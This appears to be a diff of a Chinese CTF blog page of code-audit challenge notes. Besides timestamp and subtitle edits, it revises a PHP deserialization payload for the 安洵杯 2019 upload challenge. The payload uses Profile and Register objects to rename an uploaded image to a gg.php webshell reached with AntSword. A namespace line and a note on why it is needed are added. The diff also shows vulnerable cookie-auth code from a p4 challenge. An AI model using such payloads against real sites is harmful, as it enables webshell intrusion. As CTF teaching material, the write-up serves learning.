@@ -105,7 +105,7 @@
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/55333592-3290fb00-54ca-11e9-8816-f316ed169091.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/55333654-58b69b00-54ca-11e9-8279-d88d243c7cff.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57857218-3f22a600-7821-11e9-88a5-624bf3bb442f.png">
-<meta property="og:updated_time" content="2019-12-09T15:36:50.277Z">
+<meta property="og:updated_time" content="2019-12-10T04:34:28.446Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="代码审计 题型记录">
 <meta name="twitter:description" content="安洵杯 2019 这不是文件上传从前端源码中获取几个特征关键词, 上github搜索之后可以发现源代码, 审计: 12345678910111213141516171819upload.php    &amp;lt;?phpinclude(&quot;./helper.php&quot;);class upload extends helper &amp;#123;	public function upload_base()&amp;#12">
@@ -180,7 +180,7 @@
       </a>
     </div>
       
-        <p class="site-subtitle">龙信仰总是能抓住战士们的心，或许是因为他们不求言语吧。</p>
+        <p class="site-subtitle">别浪费时间了,这里没什么值得你看的东西</p>
       
   </div>
 
@@ -349,8 +349,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-12-09T23:36:50+08:00">
-                2019-12-09
+              <time title="Post modified" itemprop="dateModified" datetime="2019-12-10T12:34:28+08:00">
+                2019-12-10
               </time>
             
           </span>
@@ -633,9 +633,12 @@
 </li>
 </ul>
 <p>最终payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$test = new Profile();</span><br><span class="line">$test -&gt; checker = 0;</span><br><span class="line">$test -&gt; except = array(&apos;index&apos; =&gt; &apos;upload	_img&apos;);</span><br><span class="line">$test -&gt; filename_tmp = &quot;./upload/08856017fa6b6b422db719c5519123dc/6d801eac2d3e2a4c8fa1c1ff256902a9.png&quot;;</span><br><span class="line">$test -&gt; filename = &quot;./upload/08856017fa6b6b422db719c5519123dc/gg.php&quot;;</span><br><span class="line">$test -&gt; ext = 1;</span><br><span class="line"></span><br><span class="line">$a = new Register();</span><br><span class="line">$a -&gt; checker = $test;</span><br><span class="line">$a -&gt; registed = 0;</span><br><span class="line"></span><br><span class="line">$exp = base64_encode(serialize($a));</span><br><span class="line">// var_dump($exp);</span><br><span class="line">echo $exp;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">namespace app\web\controller;</span><br><span class="line">$test = new Profile();</span><br><span class="line">$test -&gt; checker = 0;</span><br><span class="line">$test -&gt; except = array(&apos;index&apos; =&gt; &apos;upload	_img&apos;);</span><br><span class="line">$test -&gt; filename_tmp = &quot;./upload/08856017fa6b6b422db719c5519123dc/6d801eac2d3e2a4c8fa1c1ff256902a9.png&quot;;</span><br><span class="line">$test -&gt; filename = &quot;./upload/08856017fa6b6b422db719c5519123dc/gg.php&quot;;</span><br><span class="line">$test -&gt; ext = 1;</span><br><span class="line"></span><br><span class="line">$a = new Register();</span><br><span class="line">$a -&gt; checker = $test;</span><br><span class="line">$a -&gt; registed = 0;</span><br><span class="line"></span><br><span class="line">$exp = base64_encode(serialize($a));</span><br><span class="line">// var_dump($exp);</span><br><span class="line">echo $exp;</span><br></pre></td></tr></table></figure>
 
 <p>然后用蚁剑连接就可以了。</p>
+<blockquote>
+<p>ps: 注意必须要指定命名空间, 要不然对象序列化会出错或者是和预期对象不同</p>
+</blockquote>
 <h2 id="p4队伍出的一道题"><a href="#p4队伍出的一道题" class="headerlink" title="p4队伍出的一道题"></a>p4队伍出的一道题</h2><p>进入网站之后拿到bak文件，用sublime打开。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'../func.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../config.php'</span>;</span><br><span class="line"><span class="keyword">if</span> (!$_COOKIE[<span class="string">'otadmin'</span>]) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"Not authenticated.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/^&#123;"hash": [0-9A-Z\"]+&#125;$/'</span>, $_COOKIE[<span class="string">'otadmin'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"COOKIE TAMPERING xD IM A SECURITY EXPERT\n"</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$session_data = json_decode($_COOKIE[<span class="string">'otadmin'</span>], <span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">if</span> ($session_data === <span class="keyword">NULL</span>) &#123; <span class="keyword">echo</span> <span class="string">"COOKIE TAMPERING xD IM A SECURITY EXPERT\n"</span>; <span class="keyword">exit</span>(); &#125;</span><br><span class="line"><span class="keyword">if</span> ($session_data[<span class="string">'hash'</span>] != strtoupper(MD5($cfg_pass))) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"I CAN EVEN GIVE YOU A HINT XD \n"</span>);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; i &lt; strlen(MD5(<span class="string">'xDdddddd'</span>)); i++) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(ord(MD5($cfg_pass)[$i]) &amp; <span class="number">0xC0</span>);</span><br><span class="line">        <span class="comment">//0xC0二进制是：1100 0000</span></span><br><span class="line">        <span class="comment">//64  二进制是：0100 0000</span></span><br><span class="line">        <span class="comment">//0 0 0 64 64 64 0 64 0 0 64 0 0 0 64 64 64 64 0 0 0 64 0 0 64 0 64 0 64 64 0 0 </span></span><br><span class="line">        <span class="comment">//1 1 1 A  A  A  1 A  1 1 A  1 1 1 a  a  a  a  1 1 1 a  1 1 a  1 a  1 a  a  1 1</span></span><br><span class="line">        <span class="comment">//6 7 6 4  c  d  f 9  f 2 7  3 2 f 2  f  2  3  b 7 5 2  b f f  7 6  c 9  0  1 7 </span></span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">display_admin();</span><br></pre></td></tr></table></figure>
 
@@ -804,8 +807,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/04/22/XXE题型记录/" rel="prev" title="XXE 题型记录">
-                XXE 题型记录 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/04/22/XXE题型记录/" rel="prev" title="XXE 题型记录[working forever]">
+                XXE 题型记录[working forever] <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -885,7 +888,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">34</span>
+                  <span class="site-state-item-count">33</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
